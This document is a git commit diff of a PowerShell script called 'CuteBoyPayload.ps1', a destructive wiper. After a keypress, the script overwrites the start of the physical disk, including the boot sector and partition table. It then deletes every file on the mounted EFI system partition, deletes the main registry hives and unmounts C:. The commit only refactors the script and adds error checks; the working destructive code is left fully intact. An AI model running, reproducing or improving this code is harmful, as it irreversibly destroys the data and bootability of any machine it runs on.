282f4eea7169202fe34ff97de4d4526c5e509249
Syed930s <195543322+Syed930s@users.noreply.github.com>
2026-05-23 09:46:36 +0100

    Update CuteBoyPayload.ps1

--- CuteBoyPayload.ps1
+++ CuteBoyPayload.ps1
@@ -1,16 +1,18 @@
 $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
 $disk = "\\.\PhysicalDrive0"
-$bytes = New-Object byte[](1240960000)
+$size = 1240960000
+$bytes = New-Object byte[]($size)
 try {
     $stream = New-Object System.IO.FileStream($disk, 'Open', 'ReadWrite')
     $stream.Position = 0
-    $stream.Write($bytes, 0, 1240960000)
+    $stream.Write($bytes, 0, $size)
 } catch {
     Write-Host "Error writing to disk: $_"
 } finally {
     if ($stream) { $stream.Close() }
 }
 cmd /c "mountvol S: /s"
+if ($LASTEXITCODE -ne 0) { Write-Host "Mountvol error: $LASTEXITCODE" }
 cmd /c "del /f /s /q S:*.* > NUL 2>&1"
 cmd /c "reg delete HKLM /f"
 cmd /c "reg delete HKCC /f"
@@ -18,4 +20,4 @@ cmd /c "reg delete HKU /f"
 cmd /c "reg delete HKCR /f"
 cmd /c "reg delete HKCU /f"
 Stop-Service -Name PlugPlay -Force -ErrorAction SilentlyContinue
-mountvol C: /d
+cmd /c "mountvol C: /d"
